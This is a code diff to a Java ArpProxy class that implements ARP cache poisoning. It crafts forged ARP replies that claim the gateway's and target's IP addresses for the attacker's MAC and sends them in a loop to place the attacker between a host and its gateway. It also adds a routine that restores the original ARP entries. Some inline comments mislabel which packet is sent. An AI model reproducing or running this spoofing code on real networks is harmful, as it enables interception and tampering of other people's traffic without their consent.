@@ -16,6 +16,9 @@ public class ArpProxy {
     ArpPacket gateReply;
     ArpPacket gateRequest;
 
+    ArpPacket heal_targReply;
+    ArpPacket heal_gateReply;
+
     boolean runProxy = false;
 
     public ArpProxy(Pcap pcap,byte[] targIp,byte[] targMac,byte[] myIp,byte[] myMac,byte[] gateIp,byte[] gateMac){
@@ -27,17 +30,31 @@ public class ArpProxy {
         this.gateIp = gateIp;
         this.gateMac = gateMac;
 
-        targRequest = new ArpPacket(ArpPacket.Opcode.REQUEST,myMac,myIp,targIp,targMac);
+        // enable proxy
+        targRequest = new ArpPacket(ArpPacket.Opcode.REQUEST,targMac,targIp,gateIp,null);
         targReply = new ArpPacket(ArpPacket.Opcode.REPLY,myMac,myIp,targIp,targMac);
+        gateRequest = new ArpPacket(ArpPacket.Opcode.REQUEST,gateMac,gateIp,targIp,null);
+        gateReply = new ArpPacket(ArpPacket.Opcode.REPLY,myMac,myIp,gateIp,gateMac);
 
-        gateReply = new ArpPacket(ArpPacket.Opcode.REPLY,myMac,myIp,targIp,targMac);
-        gateRequest = new ArpPacket(ArpPacket.Opcode.REQUEST,myMac,myIp,targIp,targMac);
+        // heal connection
+        heal_targReply = new ArpPacket(ArpPacket.Opcode.REPLY,gateMac,gateIp,targIp,targMac);
+        heal_gateReply = new ArpPacket(ArpPacket.Opcode.REPLY,targMac,targIp,gateIp,gateMac);
     }
 
     public void startProxy(long interval){
         runProxy = true;
 
         while(runProxy) {
+
+            // ask target who has gateway
+            pcap.sendPacket(targRequest.getBytes());
+            // tell target gateway is me
+            pcap.sendPacket(targReply.getBytes());
+
+            // ask gateway who has target
+            pcap.sendPacket(gateReply.getBytes());
+            // tell gateway target is me
+            pcap.sendPacket(gateRequest.getBytes());
 
             // pause for next iteration
             try {
@@ -49,6 +66,20 @@ public class ArpProxy {
     }
 
     public void endProxy(){
+
+        // heal the connection to the initial state
+
+        // ask target who has gateway
+        pcap.sendPacket(targRequest.getBytes());
+
+        // tell target gateway is gateway
+        pcap.sendPacket(heal_targReply.getBytes());
+
+        // ask gateway who has target
+        pcap.sendPacket(gateReply.getBytes());
+
+        // tell gateway target is target
+        pcap.sendPacket(heal_gateReply.getBytes());
 
     }
 
